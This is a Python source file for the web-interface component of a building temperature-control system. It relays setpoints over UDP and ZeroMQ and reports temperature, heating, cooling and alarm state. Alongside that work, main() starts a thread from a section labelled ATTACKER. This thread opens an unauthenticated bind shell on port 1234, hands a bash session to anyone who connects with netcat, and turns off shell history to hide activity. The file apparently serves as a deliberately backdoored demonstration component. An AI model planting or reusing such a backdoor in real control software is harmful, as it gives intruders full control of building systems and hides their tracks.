################################################################################
# Web Interface
################################################################################

################################################################################
# IMPORTS
################################################################################
import time
import zmq
import socket
import struct
import threading
import json
import os

import pty
import sys

import flatbuffers
from BuildingConfig import *

################################################################################
# CLASSES
################################################################################


################################################################################
# VARIABLES
################################################################################
context = None

current_temp = 999.0
cooling = 0
heating = 0
alarm = 0
platform = "Ubuntu"

################################################################################
# FUNCTIONS
################################################################################

def worker():
    """
        Thread to communicate with the management interface
    """
    global context

    management_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    management_socket.bind(("0.0.0.0", 6665))

    tc_pub_socket = context.socket(zmq.PUB)
    tc_pub_socket.connect("ipc:///tmp/feeds/1")

    while True:
        message, addr = management_socket.recvfrom(128)


        #Decode flatbuffer
        config = BuildingConfig.GetRootAsBuildingConfig(message, 0)

        print "WEB: interface ", addr, config.DesiredTemp()
        setpoint = config.DesiredTemp()
        safety_range = config.SafetyRange()

        #Publish settings for TC
        tc_pub_socket.send(json.dumps({"setpoint": setpoint, "safetyRange":safety_range}))

        #Because of hiccup with the serializer in the seL4 world, this is necesarry for now
        reply = struct.pack("fiii16s", current_temp, cooling, heating, alarm, platform)

        #management_socket.connect(addr)
        management_socket.sendto(reply, (addr[0], 6666))

################################################################################
# ATTACKER
################################################################################
def attacker():
    """
        Thread to return a shell to attacker
        Connect use netcat: nc [host] [port] e.g. nc 192.168.0.102 1234 
    """
    att = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    att.bind(("0.0.0.0", 1234))
    att.listen(5)
    rem, addr = att.accept()
    os.dup2(rem.fileno(), 0)
    os.dup2(rem.fileno(), 1)
    os.dup2(rem.fileno(), 2)
    os.putenv("HISTFILE", '/dev/null')
    pty.spawn("/bin/bash")
    att.close()


################################################################################
# MAIN
################################################################################

def main():
    global context
    global current_temp
    global cooling
    global heating
    global alarm

    if not os.path.exists("/tmp/feeds"):
        os.makedirs("/tmp/feeds")

    context = zmq.Context()
    tc_socket = context.socket(zmq.SUB)
    tc_socket.setsockopt(zmq.SUBSCRIBE, "")
    tc_socket.bind("ipc:///tmp/feeds/0") 

    t = threading.Thread(target=worker)
    t.daemon = True
    t.start()

    att = threading.Thread(target=attacker)
    att.deamon = True
    att.start()

    while True:
        #  Wait for next request from client
        message = tc_socket.recv()
        print "WEB: tc", message
        message = json.loads(message)
        
        #TODO not like this :^(
        if "currentTemp" in message:
            current_temp = message["currentTemp"]

        if "cooling" in message:
            cooling = message["cooling"]

        if "heating" in message:
            heating = message["heating"]

        if "alarm" in message:
            alarm = message["alarm"]

if __name__ == "__main__":
    main()
